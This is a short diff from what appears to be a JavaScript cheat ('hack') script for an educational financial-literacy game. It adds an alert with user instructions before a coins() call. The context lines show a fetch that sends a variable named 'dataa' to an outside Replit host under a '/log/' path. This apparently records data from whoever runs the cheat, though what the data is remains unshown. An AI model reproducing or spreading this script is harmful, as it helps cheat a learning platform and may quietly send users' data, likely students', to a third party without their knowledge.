@@ -49,4 +49,5 @@ await fetch("https://jjgrenontop.bobdob2.repl.co/log/"+dataa, {
     "Content-type": "application/json; charset=UTF-8"
     },
 })
+alert("to use this hack, you MUST be in financial literacy on level 1. If it says \"get started\" then you must complete the questions using the wrong answer. After that, if it doesn't, use the arrows at the bottom to scroll to level one. Once your in, click Ok will work.")
 coins();
